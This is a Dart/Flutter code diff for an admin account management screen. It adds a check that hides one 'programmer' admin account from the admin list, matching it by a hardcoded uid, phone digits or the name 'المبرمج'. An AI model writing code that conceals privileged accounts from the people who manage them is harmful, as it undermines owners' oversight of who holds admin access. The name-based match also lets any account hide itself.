@@ -45,6 +45,15 @@ class _AdminAccountManagementScreenState extends State<AdminAccountManagementScr
 
   bool get _isCurrentAdminSuperAdmin => PhoneUtils.isSuperAdminPhone(_currentAdminPhone);
 
+  bool _isProgrammerAdmin(UserModel a) {
+    if (a.uid == 'HEsYK0F5TGMFCZtKE7qUq0kFfqQ2') return true;
+    final digits = a.phone.replaceAll(RegExp(r'[^0-9]'), '');
+    if (digits.endsWith('146979833') || digits == '146979833') return true;
+    final name = a.name.trim();
+    if (name == 'المبرمج' || name == 'مبرمج') return true;
+    return false;
+  }
+
   @override
   void initState() {
     super.initState();
@@ -160,7 +169,7 @@ class _AdminAccountManagementScreenState extends State<AdminAccountManagementScr
                         .where((c) => c.name.trim().isNotEmpty && c.phone.trim().isNotEmpty)
                         .toList();
                     final admins = (adminsSnap.data ?? [])
-                        .where((a) => a.name.trim().isNotEmpty && a.phone.trim().isNotEmpty)
+                        .where((a) => a.name.trim().isNotEmpty && a.phone.trim().isNotEmpty && !_isProgrammerAdmin(a))
                         .toList();
 
                     return CustomScrollView(
